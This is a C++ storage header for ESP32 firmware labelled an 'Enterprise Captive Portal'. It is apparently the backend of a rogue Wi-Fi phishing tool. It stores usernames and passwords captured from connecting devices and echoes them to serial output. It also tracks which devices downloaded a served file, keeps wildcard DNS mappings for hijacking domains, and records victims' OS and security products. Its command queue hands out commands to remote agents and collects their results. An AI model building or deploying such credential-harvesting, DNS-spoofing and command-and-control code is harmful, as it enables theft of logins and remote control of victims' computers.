/*
 * ============================================================================
 *  ESP32 Enterprise Captive Portal - Storage Functions
 *  Version: 2.0.0
 * ============================================================================
 */

#ifndef STORAGE_H
#define STORAGE_H

#include <SPIFFS.h>
#include <ArduinoJson.h>
#include "config.h"

// ============================================================================
//  SPIFFS Initialization
// ============================================================================
bool initStorage() {
    if (!SPIFFS.begin(true)) {
        Serial.println("[ERROR] SPIFFS mount failed, formatting...");
        SPIFFS.format();
        if (!SPIFFS.begin()) {
            Serial.println("[ERROR] SPIFFS mount failed after format");
            return false;
        }
    }
    Serial.println("[OK] SPIFFS mounted");
    
    // Initialize devices file
    if (!SPIFFS.exists(Config::DEVICES_FILE)) {
        File f = SPIFFS.open(Config::DEVICES_FILE, "w");
        if (f) {
            f.print("[]");
            f.close();
            Serial.println("[OK] Created devices.json");
        }
    }
    
    // Initialize credentials file
    if (!SPIFFS.exists(Config::CREDS_FILE)) {
        File f = SPIFFS.open(Config::CREDS_FILE, "w");
        if (f) {
            f.print("[]");
            f.close();
            Serial.println("[OK] Created credentials.json");
        }
    }
    
    // Initialize DNS mappings file
    if (!SPIFFS.exists(Config::DNS_MAPPINGS_FILE)) {
        File f = SPIFFS.open(Config::DNS_MAPPINGS_FILE, "w");
        if (f) {
            f.print("[]");
            f.close();
            Serial.println("[OK] Created dns_mappings.json");
        }
    }
    
    // Initialize settings file
    if (!SPIFFS.exists(Config::SETTINGS_FILE)) {
        File f = SPIFFS.open(Config::SETTINGS_FILE, "w");
        if (f) {
            f.print("{\"redirectEnabled\":false,\"redirectTarget\":\"\",\"staConnected\":false,\"staSSID\":\"\"}");
            f.close();
            Serial.println("[OK] Created settings.json");
        }
    }
    
    // Initialize clients file
    if (!SPIFFS.exists(Config::CLIENTS_FILE)) {
        File f = SPIFFS.open(Config::CLIENTS_FILE, "w");
        if (f) {
            f.print("[]");
            f.close();
            Serial.println("[OK] Created clients.json");
        }
    }
    
    return true;
}

// ============================================================================
//  Device Storage
// ============================================================================
void saveDevice(const String& ip, DeviceType type, bool fileDownloaded = false) {
    File f = SPIFFS.open(Config::DEVICES_FILE, "r");
    String content = "[]";
    if (f) {
        content = f.readString();
        f.close();
    }
    
    DynamicJsonDocument doc(Config::JSON_DOC_SIZE);
    DeserializationError error = deserializeJson(doc, content);
    if (error) {
        doc.to<JsonArray>();
    }
    
    JsonArray arr = doc.as<JsonArray>();
    
    // Check if device exists, update if found
    bool found = false;
    for (JsonObject obj : arr) {
        if (obj["ip"].as<String>() == ip) {
            obj["lastSeen"] = millis() / 1000;
            if (fileDownloaded) obj["fileDownloaded"] = true;
            found = true;
            break;
        }
    }
    
    // Add new device
    if (!found) {
        // Limit array size
        while (arr.size() >= Config::MAX_DEVICES) {
            arr.remove(0);
        }
        
        JsonObject newDevice = arr.createNestedObject();
        newDevice["ip"] = ip;
        newDevice["type"] = deviceTypeToString(type);
        newDevice["typeCode"] = static_cast<int>(type);
        newDevice["timestamp"] = millis() / 1000;
        newDevice["lastSeen"] = millis() / 1000;
        newDevice["fileDownloaded"] = fileDownloaded;
    }
    
    f = SPIFFS.open(Config::DEVICES_FILE, "w");
    if (f) {
        serializeJson(doc, f);
        f.close();
    }
}

void markFileDownloaded(const String& ip) {
    File f = SPIFFS.open(Config::DEVICES_FILE, "r");
    String content = "[]";
    if (f) {
        content = f.readString();
        f.close();
    }
    
    DynamicJsonDocument doc(Config::JSON_DOC_SIZE);
    deserializeJson(doc, content);
    JsonArray arr = doc.as<JsonArray>();
    
    for (JsonObject obj : arr) {
        if (obj["ip"].as<String>() == ip) {
            obj["fileDownloaded"] = true;
            break;
        }
    }
    
    f = SPIFFS.open(Config::DEVICES_FILE, "w");
    if (f) {
        serializeJson(doc, f);
        f.close();
    }
}

// ============================================================================
//  Credentials Storage
// ============================================================================
void saveCredentials(const String& ip, const String& username, const String& password, DeviceType type) {
    File f = SPIFFS.open(Config::CREDS_FILE, "r");
    String content = "[]";
    if (f) {
        content = f.readString();
        f.close();
    }
    
    DynamicJsonDocument doc(Config::JSON_DOC_SIZE);
    DeserializationError error = deserializeJson(doc, content);
    if (error) {
        doc.to<JsonArray>();
    }
    
    JsonArray arr = doc.as<JsonArray>();
    
    // Limit array size
    while (arr.size() >= Config::MAX_CREDENTIALS) {
        arr.remove(0);
    }
    
    JsonObject newCred = arr.createNestedObject();
    newCred["ip"] = ip;
    newCred["username"] = username;
    newCred["password"] = password;
    newCred["device"] = deviceTypeToString(type);
    newCred["timestamp"] = millis() / 1000;
    
    f = SPIFFS.open(Config::CREDS_FILE, "w");
    if (f) {
        serializeJson(doc, f);
        f.close();
    }
    
    Serial.printf("[CRED] %s | %s | %s\n", ip.c_str(), username.c_str(), password.c_str());
}

// ============================================================================
//  Data Retrieval
// ============================================================================
String getDevicesJson() {
    File f = SPIFFS.open(Config::DEVICES_FILE, "r");
    if (!f) return "[]";
    String content = f.readString();
    f.close();
    return content;
}

String getCredentialsJson() {
    File f = SPIFFS.open(Config::CREDS_FILE, "r");
    if (!f) return "[]";
    String content = f.readString();
    f.close();
    return content;
}

bool clearAllData() {
    bool success = true;
    
    File f = SPIFFS.open(Config::DEVICES_FILE, "w");
    if (f) { f.print("[]"); f.close(); }
    else success = false;
    
    f = SPIFFS.open(Config::CREDS_FILE, "w");
    if (f) { f.print("[]"); f.close(); }
    else success = false;
    
    return success;
}

// ============================================================================
//  DNS Mappings Storage
// ============================================================================
String getDnsMappingsJson() {
    File f = SPIFFS.open(Config::DNS_MAPPINGS_FILE, "r");
    if (!f) return "[]";
    String content = f.readString();
    f.close();
    return content;
}

bool saveDnsMapping(const String& domain, const String& ip) {
    File f = SPIFFS.open(Config::DNS_MAPPINGS_FILE, "r");
    String content = "[]";
    if (f) {
        content = f.readString();
        f.close();
    }
    
    DynamicJsonDocument doc(Config::JSON_DOC_SIZE);
    DeserializationError error = deserializeJson(doc, content);
    if (error) {
        doc.to<JsonArray>();
    }
    
    JsonArray arr = doc.as<JsonArray>();
    
    // Check if domain exists, update if found
    bool found = false;
    for (JsonObject obj : arr) {
        if (obj["domain"].as<String>() == domain) {
            obj["ip"] = ip;
            found = true;
            break;
        }
    }
    
    // Add new mapping
    if (!found) {
        while (arr.size() >= Config::MAX_DNS_MAPPINGS) {
            arr.remove(0);
        }
        JsonObject newMapping = arr.createNestedObject();
        newMapping["domain"] = domain;
        newMapping["ip"] = ip;
    }
    
    f = SPIFFS.open(Config::DNS_MAPPINGS_FILE, "w");
    if (f) {
        serializeJson(doc, f);
        f.close();
        return true;
    }
    return false;
}

bool deleteDnsMapping(const String& domain) {
    File f = SPIFFS.open(Config::DNS_MAPPINGS_FILE, "r");
    String content = "[]";
    if (f) {
        content = f.readString();
        f.close();
    }
    
    DynamicJsonDocument doc(Config::JSON_DOC_SIZE);
    deserializeJson(doc, content);
    JsonArray arr = doc.as<JsonArray>();
    
    for (size_t i = 0; i < arr.size(); i++) {
        if (arr[i]["domain"].as<String>() == domain) {
            arr.remove(i);
            break;
        }
    }
    
    f = SPIFFS.open(Config::DNS_MAPPINGS_FILE, "w");
    if (f) {
        serializeJson(doc, f);
        f.close();
        return true;
    }
    return false;
}

IPAddress resolveDnsMapping(const String& domain) {
    File f = SPIFFS.open(Config::DNS_MAPPINGS_FILE, "r");
    if (!f) return IPAddress(0, 0, 0, 0);
    
    String content = f.readString();
    f.close();
    
    DynamicJsonDocument doc(Config::JSON_DOC_SIZE);
    deserializeJson(doc, content);
    JsonArray arr = doc.as<JsonArray>();
    
    String lowerDomain = domain;
    lowerDomain.toLowerCase();
    
    for (JsonObject obj : arr) {
        String mappedDomain = obj["domain"].as<String>();
        mappedDomain.toLowerCase();
        
        // Exact match or wildcard match
        if (mappedDomain == lowerDomain || 
            (mappedDomain.startsWith("*.") && lowerDomain.endsWith(mappedDomain.substring(1)))) {
            IPAddress ip;
            if (ip.fromString(obj["ip"].as<String>())) {
                return ip;
            }
        }
    }
    
    return IPAddress(0, 0, 0, 0);
}

// ============================================================================
//  Settings Storage (Redirect Enforcement, etc.)
// ============================================================================
String getSettingsJson() {
    File f = SPIFFS.open(Config::SETTINGS_FILE, "r");
    if (!f) return "{\"redirectEnabled\":false,\"redirectTarget\":\"\",\"staConnected\":false,\"staSSID\":\"\"}";
    String content = f.readString();
    f.close();
    return content;
}

bool saveSettings(const String& settingsJson) {
    File f = SPIFFS.open(Config::SETTINGS_FILE, "w");
    if (f) {
        f.print(settingsJson);
        f.close();
        return true;
    }
    return false;
}

bool getRedirectEnabled() {
    String settings = getSettingsJson();
    DynamicJsonDocument doc(1024);
    deserializeJson(doc, settings);
    return doc["redirectEnabled"] | false;
}

String getRedirectTarget() {
    String settings = getSettingsJson();
    DynamicJsonDocument doc(1024);
    deserializeJson(doc, settings);
    return doc["redirectTarget"] | "";
}

bool setRedirectSettings(bool enabled, const String& target) {
    String settings = getSettingsJson();
    DynamicJsonDocument doc(1024);
    deserializeJson(doc, settings);
    doc["redirectEnabled"] = enabled;
    doc["redirectTarget"] = target;
    String output;
    serializeJson(doc, output);
    return saveSettings(output);
}

bool setStaConnectionInfo(bool connected, const String& ssid) {
    String settings = getSettingsJson();
    DynamicJsonDocument doc(1024);
    deserializeJson(doc, settings);
    doc["staConnected"] = connected;
    doc["staSSID"] = ssid;
    String output;
    serializeJson(doc, output);
    return saveSettings(output);
}

// ============================================================================
//  Security Monitor Clients Storage
// ============================================================================
String getClientsJson() {
    File f = SPIFFS.open(Config::CLIENTS_FILE, "r");
    if (!f) return "[]";
    String content = f.readString();
    f.close();
    return content;
}

bool saveClientReport(const String& hostname, const String& ip, const String& osType,
                      const String& osVersion, const String& osBuild, const String& osArch,
                      const String& status, const String& securityJson, const String& clientId = "") {
    File f = SPIFFS.open(Config::CLIENTS_FILE, "r");
    String content = "[]";
    if (f) {
        content = f.readString();
        f.close();
    }
    
    DynamicJsonDocument doc(Config::JSON_DOC_SIZE);
    DeserializationError error = deserializeJson(doc, content);
    if (error) {
        doc.to<JsonArray>();
    }
    
    JsonArray arr = doc.as<JsonArray>();
    
    // Check if client exists (by hostname), update if found
    bool found = false;
    for (JsonObject obj : arr) {
        if (obj["hostname"].as<String>() == hostname) {
            obj["ip"] = ip;
            obj["osType"] = osType;
            obj["osVersion"] = osVersion;
            obj["osBuild"] = osBuild;
            obj["osArch"] = osArch;
            obj["status"] = status;
            obj["lastSeen"] = millis() / 1000;
            if (clientId.length() > 0) {
                obj["clientId"] = clientId;
            }
            
            // Parse and store security products
            DynamicJsonDocument secDoc(2048);
            if (!deserializeJson(secDoc, securityJson)) {
                obj["security"] = secDoc.as<JsonArray>();
            }
            
            found = true;
            break;
        }
    }
    
    // Add new client
    if (!found) {
        while (arr.size() >= Config::MAX_CLIENTS) {
            arr.remove(0);
        }
        
        JsonObject newClient = arr.createNestedObject();
        newClient["hostname"] = hostname;
        newClient["ip"] = ip;
        newClient["osType"] = osType;
        newClient["osVersion"] = osVersion;
        newClient["osBuild"] = osBuild;
        newClient["osArch"] = osArch;
        newClient["status"] = status;
        newClient["firstSeen"] = millis() / 1000;
        newClient["lastSeen"] = millis() / 1000;
        if (clientId.length() > 0) {
            newClient["clientId"] = clientId;
        }
        
        // Parse and store security products
        DynamicJsonDocument secDoc(2048);
        if (!deserializeJson(secDoc, securityJson)) {
            newClient["security"] = secDoc.as<JsonArray>();
        }
    }
    
    f = SPIFFS.open(Config::CLIENTS_FILE, "w");
    if (f) {
        serializeJson(doc, f);
        f.close();
        return true;
    }
    return false;
}

bool deleteClient(const String& hostname) {
    File f = SPIFFS.open(Config::CLIENTS_FILE, "r");
    String content = "[]";
    if (f) {
        content = f.readString();
        f.close();
    }
    
    DynamicJsonDocument doc(Config::JSON_DOC_SIZE);
    deserializeJson(doc, content);
    JsonArray arr = doc.as<JsonArray>();
    
    for (size_t i = 0; i < arr.size(); i++) {
        if (arr[i]["hostname"].as<String>() == hostname) {
            arr.remove(i);
            break;
        }
    }
    
    f = SPIFFS.open(Config::CLIENTS_FILE, "w");
    if (f) {
        serializeJson(doc, f);
        f.close();
        return true;
    }
    return false;
}

bool clearClients() {
    File f = SPIFFS.open(Config::CLIENTS_FILE, "w");
    if (f) {
        f.print("[]");
        f.close();
        return true;
    }
    return false;
}

// ============================================================================
//  Agent Command Queue Storage
// ============================================================================
String g_commandQueue = "[]";
String g_commandResults = "[]";

bool queueCommand(const String& clientId, const String& command) {
    DynamicJsonDocument doc(4096);
    deserializeJson(doc, g_commandQueue);
    JsonArray arr = doc.as<JsonArray>();
    
    // Generate command ID
    String commandId = String(millis()) + "-" + String(random(1000, 9999));
    
    JsonObject cmd = arr.createNestedObject();
    cmd["clientId"] = clientId;
    cmd["command"] = command;
    cmd["commandId"] = commandId;
    cmd["timestamp"] = millis() / 1000;
    cmd["pending"] = true;
    
    serializeJson(doc, g_commandQueue);
    Serial.printf("[CMD] Queued for %s: %s\n", clientId.c_str(), command.c_str());
    return true;
}

String getPendingCommand(const String& clientId) {
    DynamicJsonDocument doc(4096);
    deserializeJson(doc, g_commandQueue);
    JsonArray arr = doc.as<JsonArray>();
    
    for (size_t i = 0; i < arr.size(); i++) {
        JsonObject cmd = arr[i];
        if (cmd["clientId"].as<String>() == clientId && cmd["pending"].as<bool>()) {
            // Mark as not pending
            cmd["pending"] = false;
            serializeJson(doc, g_commandQueue);
            
            // Return command info
            DynamicJsonDocument result(512);
            result["command"] = cmd["command"];
            result["commandId"] = cmd["commandId"];
            String output;
            serializeJson(result, output);
            return output;
        }
    }
    
    return "";
}

bool saveCommandResult(const String& clientId, const String& commandId, const String& result) {
    DynamicJsonDocument doc(8192);
    deserializeJson(doc, g_commandResults);
    JsonArray arr = doc.as<JsonArray>();
    
    // Limit results
    while (arr.size() >= 20) {
        arr.remove(0);
    }
    
    JsonObject res = arr.createNestedObject();
    res["clientId"] = clientId;
    res["commandId"] = commandId;
    res["result"] = result;
    res["timestamp"] = millis() / 1000;
    
    serializeJson(doc, g_commandResults);
    return true;
}

String getCommandResults(const String& clientId) {
    if (clientId.length() == 0) {
        return g_commandResults;
    }
    
    DynamicJsonDocument doc(4096);
    deserializeJson(doc, g_commandResults);
    JsonArray arr = doc.as<JsonArray>();
    
    DynamicJsonDocument filtered(4096);
    JsonArray filteredArr = filtered.to<JsonArray>();
    
    for (JsonObject res : arr) {
        if (res["clientId"].as<String>() == clientId) {
            filteredArr.add(res);
        }
    }
    
    String output;
    serializeJson(filtered, output);
    return output;
}

void clearCommandResults() {
    g_commandResults = "[]";
    g_commandQueue = "[]";
}

#endif
